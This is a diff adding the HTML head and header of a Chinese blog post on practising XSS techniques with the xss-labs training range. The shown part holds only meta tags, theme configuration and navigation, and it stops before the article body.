@@ -1,0 +1,1036 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E6%A5%BD.png">
+  <link rel="icon" href="/img/%E6%A5%BD.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="神楽">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶场搭建  靶场下载地址：https:&#x2F;&#x2F;github.com&#x2F;do0dl3&#x2F;xss-labs  搭建很简单，这里就不讲了。  这里也可以像我一样直接用别人搭建好的公共靶场：https:&#x2F;&#x2F;xssaq.com&#x2F;。进入然后点击&#96;游戏挑战&#96;即可。不过因为是别人搭载的服务器，有可能会有加载过慢等等的问题，所以建议还是搭在本地练习。  个人重要总结第一点：F12查看网络中的响应包、右键查看页面源代码和F1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss各种姿势的学习">
+<meta property="og:url" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="神楽的博客">
+<meta property="og:description" content="靶场搭建  靶场下载地址：https:&#x2F;&#x2F;github.com&#x2F;do0dl3&#x2F;xss-labs  搭建很简单，这里就不讲了。  这里也可以像我一样直接用别人搭建好的公共靶场：https:&#x2F;&#x2F;xssaq.com&#x2F;。进入然后点击&#96;游戏挑战&#96;即可。不过因为是别人搭载的服务器，有可能会有加载过慢等等的问题，所以建议还是搭在本地练习。  个人重要总结第一点：F12查看网络中的响应包、右键查看页面源代码和F1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/001-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/002-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/003-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/004-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/005-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/006-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/007-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/009-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/010-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/011-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/012-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/013-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/014-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/015-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/016-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/017-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/018-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/019-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/020-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/021-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/022-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/023-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/024-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/025-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/026-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/027-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/028-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/029-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/030-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/031-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/032-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/033-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/034-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/035-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/036-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/037-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/038-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/039-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/040-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/041-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/042-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/043-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/044-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/045-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/046-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/047-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/048-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/049-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/050-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/051-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/052-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/053-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/054-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/055-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/056-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/057-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/058-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/059-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/060-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/061-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/062-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/063-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/064-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/065-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/066-image.jpg">
+<meta property="og:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/067-image.jpg">
+<meta property="article:published_time" content="2024-10-31T12:12:04.000Z">
+<meta property="article:modified_time" content="2025-06-27T04:18:11.002Z">
+<meta property="article:author" content="神楽">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://helloworldbugs.gitlab.io/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/001-image.jpg">
+  
+  
+  
+  <title>xss各种姿势的学习 - 神楽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>神楽的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="xss各种姿势的学习"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-10-31 20:12" pubdate>
+          2024年10月31日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          76 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
